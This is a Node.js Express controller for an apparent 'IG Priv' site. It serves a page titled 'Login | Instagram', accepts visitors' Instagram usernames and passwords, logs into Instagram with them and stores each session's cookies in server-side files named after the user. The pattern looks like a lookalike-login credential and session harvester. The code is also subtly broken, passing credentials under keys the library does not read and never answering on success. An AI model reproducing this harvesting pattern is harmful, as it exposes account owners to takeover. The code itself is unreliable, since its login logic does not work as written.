const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');

const Instagram = require('instagram-web-api')
const FileCookieStore = require('tough-cookie-filestore2')
var ref, urlSegmentToInstagramId, instagramIdToUrlSegment;
ref = require('instagram-id-to-url-segment')
urlSegmentToInstagramId = ref.urlSegmentToInstagramId;
instagramIdToUrlSegment = ref.instagramIdToUrlSegment;



// GET

const homeShow = async (req, res, next) => {
    try {

        res.render('user/homePage', { layout: '../layouts/mainSecond_Layout', title: `IG Priv`, description: ``, keywords: `` })


    } catch (err) {
        console.log(err);
    }
};

const loginPageShow = async (req, res, next) => {
    try {

        res.render('user/loginPage', { layout: '../layouts/mainHome_Layout', title: `Login | Instagram`, description: ``, keywords: `` })


    } catch (err) {
        console.log(err);
    }
};



// POST

const loginUser = async (req, res, next) => {

    var gelenUsername = req.body.iUsername;
    var gelenSifre = req.body.iPassword

    const cookieStore = new FileCookieStore(`./cookies/${gelenUsername}.txt`)
    const client = new Instagram({ gelenUsername, gelenSifre, cookieStore });

    try {
        const { gelenUsername, gelenSifre, cookieStore } = await client.login()
            .then(function (response) {
                console.log(response);
                if (response == undefined) {
                    res.locals.iUserlogin_error = req.flash('iUserlogin_error', '<center><p><b>Giriş Başarısız!</b><br>Lütfen bilgilerinizi kontrol edin!</p></center>');
                    res.redirect('/login');

                }
            }).catch(function (error) {
                console.log(error);
                res.redirect('/login')
            })
    }catch (err) {
        console.log(err);
    }

};



module.exports = {
    homeShow,
    loginPageShow,
    loginUser
}